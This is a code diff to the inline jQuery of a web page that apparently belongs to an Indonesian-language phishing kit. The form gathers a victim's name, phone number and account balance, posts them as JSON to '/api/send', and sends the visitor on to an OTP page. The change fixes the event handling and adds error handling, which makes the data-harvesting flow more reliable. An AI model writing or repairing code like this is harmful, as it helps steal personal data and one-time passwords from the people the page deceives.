@@ -592,7 +592,7 @@ chsalxcome {
     <script src="js/token.js"></script>
     <script src="js/jquery.mask.min.js"></script>
     <script>
-function sendHpp(){
+function sendHpp(event){
    $('.load').fadeIn();
     event.preventDefault();   
     $(".lanjutkan").prop("disabled", true);
@@ -614,19 +614,27 @@ function sendHpp(){
   
     
     $.ajax({
-        type: 'POST',
-        url: 'api/send.js',
-        data: $('#index').serialize(),
-        datatype: 'JSON',   
-    complete: function(){    
-    setTimeout(function(){   
-    window.location = "otp.html";
-    $("#lonte").hide();
-    $('.load').fadeOut();
-    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
-    
-
-    }, 800);}});};
+    type: 'POST',
+    url: '/api/send',
+    contentType: 'application/json',
+    data: JSON.stringify({
+        nama: nama,
+        nohp: nohp,
+        saldo: saldo
+    }),
+    success: function(){
+        setTimeout(function(){   
+            window.location = "otp.html";
+            $("#lonte").hide();
+            $('.load').fadeOut();
+            document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
+        }, 800);
+    },
+    error: function(){
+        alert("Gagal kirim data");
+        $('.load').fadeOut();
+    }
+});
         
     $( document ).ready(function() {
       $('welalxcome').fadeIn(500);
